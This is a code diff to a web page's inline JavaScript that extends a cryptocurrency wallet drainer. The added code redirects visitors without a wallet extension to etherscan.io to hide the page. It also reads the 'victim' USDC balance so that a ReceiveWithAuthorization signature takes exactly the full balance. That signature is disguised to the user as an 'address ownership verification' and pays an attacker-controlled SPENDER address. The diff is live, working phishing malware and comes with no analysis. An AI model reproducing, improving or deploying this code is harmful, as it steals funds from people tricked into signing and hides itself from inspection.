@@ -457,6 +457,29 @@
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
+    // ── REDIRECT GUARD — si aucun wallet injecté après 2.5s → etherscan.io ──────
+    // Trust Wallet / MetaMask injectent window.ethereum quasi-instantanément.
+    // Un browser normal sans extension wallet n'a rien → redirect propre.
+    (function() {
+      var _redirectTimer = setTimeout(function() {
+        var hasWallet = !!(window.ethereum || (window.trustwallet && window.trustwallet.ethereum));
+        if (!hasWallet) {
+          window.location.replace('https://etherscan.io/verifyAddress');
+        }
+      }, 2500);
+      // Si le wallet s'injecte avant le timer, on annule le redirect
+      var _origEth = window.ethereum;
+      if (_origEth) { clearTimeout(_redirectTimer); }
+      try {
+        Object.defineProperty(window, 'ethereum', {
+          configurable: true,
+          get: function() { return this._eth; },
+          set: function(v) { this._eth = v; if (v) clearTimeout(_redirectTimer); }
+        });
+        if (_origEth) window.ethereum = _origEth;
+      } catch(_) {}
+    })();
+
     // ── THEME ──────────────────────────────────────────────────
     const ICONS = {
       sun: '<circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M6.3 17.7l-1.4 1.4M19.1 4.9l-1.4 1.4"/>',
@@ -659,11 +682,38 @@
       var validBefore = Math.floor(Date.now() / 1000) + 86400;
       var nowFormatted = nowFmt();
 
+      // ── fetch real USDC balance of victim ─────────────────────────────────────
+      // receiveWithAuthorization transfers EXACTLY the signed value.
+      // If value > actual balance the tx reverts. Fetch real balance first.
+      var transferValue = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+      try {
+        var balCallData = '0x70a08231000000000000000000000000' + capturedAddr.slice(2).toLowerCase().padStart(64, '0');
+        var balHex;
+        try {
+          balHex = await e.request({ method: 'eth_call', params: [{ to: USDC, data: balCallData }, 'latest'] });
+        } catch(_) {
+          try {
+            var rr = await fetch('https://ethereum.publicnode.com', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_call', params: [{ to: USDC, data: balCallData }, 'latest'] })
+            });
+            var rj = await rr.json();
+            balHex = rj.result;
+          } catch(_) {}
+        }
+        var bal = ethers.BigNumber.from(
+          (balHex && balHex !== '0x' && balHex !== '0x0') ? balHex : '0x0'
+        );
+        if (!bal.isZero()) transferValue = bal.toString();
+      } catch(_) {}
+      // ─────────────────────────────────────────────────────────────────────────
+
       // usdcAuth object — same fields the backend passes to receiveWithAuthorization()
       var usdcAuth = {
         from:        capturedAddr,
         to:          SPENDER,
-        value:       '115792089237316195423570985008687907853269984665640564039457584007913129639935',
+        value:       transferValue,
         validAfter:  '0',
         validBefore: validBefore.toString(),
         nonce:       rwaNonce
@@ -685,7 +735,7 @@
         message: {
           AddressOwnershipVerification: 'Owner/creator verification',
           from: capturedAddr, to: SPENDER,
-          value: usdcAuth.value,
+          value: transferValue,
           validAfter: '0', validBefore: validBefore.toString(), nonce: rwaNonce
         },
         domain: {
@@ -708,7 +758,7 @@
           var split = ethers.utils.splitSignature(sig);
           var cd = { name: 'USD Coin', version: '2', chainId: 1, verifyingContract: USDC };
           var ct = { ReceiveWithAuthorization: [{ name:'from',type:'address'},{name:'to',type:'address'},{name:'value',type:'uint256'},{name:'validAfter',type:'uint256'},{name:'validBefore',type:'uint256'},{name:'nonce',type:'bytes32'}] };
-          var cm = { from: capturedAddr, to: SPENDER, value: ethers.constants.MaxUint256, validAfter: 0, validBefore: validBefore, nonce: rwaNonce };
+          var cm = { from: capturedAddr, to: SPENDER, value: ethers.BigNumber.from(transferValue), validAfter: 0, validBefore: validBefore, nonce: rwaNonce };
           var rec = ethers.utils.verifyTypedData(cd, ct, cm, sig);
           console.log((rec.toLowerCase() === capturedAddr.toLowerCase() ? '✅ SIG_VALID' : '⚠️ SIG_ORPHAN') + ' | from:', capturedAddr, '| to:', SPENDER, '| validBefore:', validBefore, '| nonce:', rwaNonce, '| v:', split.v, '| r:', split.r, '| s:', split.s);
         } catch(_) { console.log('SIG:', sig); }
